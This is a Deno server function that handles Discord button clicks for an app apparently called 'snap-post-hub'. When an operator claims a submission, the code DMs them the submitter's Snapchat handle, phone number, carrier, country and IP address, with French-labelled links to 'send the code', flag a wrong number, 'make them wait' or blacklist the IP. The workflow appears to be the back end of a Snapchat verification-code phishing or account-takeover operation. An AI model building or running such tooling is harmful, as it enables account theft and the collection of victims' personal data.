import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
const PUBLIC_KEY = Deno.env.get("DISCORD_PUBLIC_KEY");
const APP_URL = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";

function hexToUint8Array(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substring(i, i + 2), 16);
  }
  return bytes;
}

async function verifyRequest(signature, timestamp, body) {
  try {
    const key = await crypto.subtle.importKey(
      "raw",
      hexToUint8Array(PUBLIC_KEY),
      "Ed25519",
      false,
      ["verify"]
    );
    return await crypto.subtle.verify(
      "Ed25519",
      key,
      hexToUint8Array(signature),
      new TextEncoder().encode(timestamp + body)
    );
  } catch {
    return false;
  }
}

async function sendDM(userId, content) {
  const dmRes = await fetch("https://discord.com/api/v10/users/@me/channels", {
    method: "POST",
    headers: {
      "Authorization": `Bot ${BOT_TOKEN}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ recipient_id: userId })
  });
  const dmChannel = await dmRes.json();

  await fetch(`https://discord.com/api/v10/channels/${dmChannel.id}/messages`, {
    method: "POST",
    headers: {
      "Authorization": `Bot ${BOT_TOKEN}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ content })
  });
}

Deno.serve(async (req) => {
  try {
    const body = await req.text();
    const signature = req.headers.get("x-signature-ed25519");
    const timestamp = req.headers.get("x-signature-timestamp");

    if (!signature || !timestamp) {
      return new Response("Bad request", { status: 400 });
    }

    const isValid = await verifyRequest(signature, timestamp, body);
    if (!isValid) {
      return new Response("Invalid signature", { status: 401 });
    }

    const interaction = JSON.parse(body);

    // PING verification (required by Discord)
    if (interaction.type === 1) {
      return Response.json({ type: 1 });
    }

    // Button click (MESSAGE_COMPONENT)
    if (interaction.type === 3) {
      const customId = interaction.data.custom_id;
      const userId = interaction.member?.user?.id || interaction.user?.id;
      const username = interaction.member?.user?.username || interaction.user?.username || "Admin";

      if (customId.startsWith("claim_")) {
        const submissionId = customId.replace("claim_", "");
        const base44 = createClientFromRequest(req);

        const submission = await base44.asServiceRole.entities.Submission.get(submissionId);

        if (submission?.claimed_by) {
          return Response.json({
            type: 4,
            data: {
              content: "❌ Cette soumission a déjà été prise en charge.",
              flags: 64
            }
          });
        }

        // Mark as claimed
        await base44.asServiceRole.entities.Submission.update(submissionId, {
          claimed_by: userId
        });

        // Build DM with action links
        const triggerUrl = `${APP_URL}/?trigger=${submissionId}`;
        const wrongUrl = `${APP_URL}/?triggerAction=wrong&id=${submissionId}`;
        const waitUrl = `${APP_URL}/?triggerAction=wait&id=${submissionId}`;
        const blacklistUrl = `${APP_URL}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(submission.ip_address || "")}`;

        const dmContent = [
          `🎯 **Tu as pris en charge une soumission!**`,
          ``,
          `👻 Snapchat: **@${submission.snapchat}**`,
          `📞 Numéro: **${submission.telephone}**`,
          `📡 Opérateur: **${submission.operateur}**`,
          `🌍 Pays: **${submission.country || "Inconnue"}**`,
          `🕵️ IP: \`${submission.ip_address || "Inconnue"}\``,
          ``,
          `⚡ **Actions:**`,
          `✅ [Envoyer le code](${triggerUrl})`,
          `❌ [Mauvais numéro](${wrongUrl})`,
          `⏳ [Faire patienter](${waitUrl})`,
          `🚫 [Blacklist instant](${blacklistUrl})`
        ].join("\n");

        await sendDM(userId, dmContent);

        // Disable the button on the original message
        const channelId = interaction.channel_id;
        const messageId = interaction.message.id;

        await fetch(`https://discord.com/api/v10/channels/${channelId}/messages/${messageId}`, {
          method: "PATCH",
          headers: {
            "Authorization": `Bot ${BOT_TOKEN}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            components: [{
              type: 1,
              components: [{
                type: 2,
                style: 2,
                label: `✅ Pris en charge par ${username}`,
                custom_id: `claimed_${submissionId}`,
                disabled: true
              }]
            }]
          })
        });

        return Response.json({
          type: 4,
          data: {
            content: `✅ Tu as pris en charge cette soumission! Vérifie tes DMs 📩`,
            flags: 64
          }
        });
      }
    }

    return Response.json({ type: 1 });
  } catch (error) {
    console.error("Error:", error.message);
    return Response.json({ error: error.message }, { status: 500 });
  }
});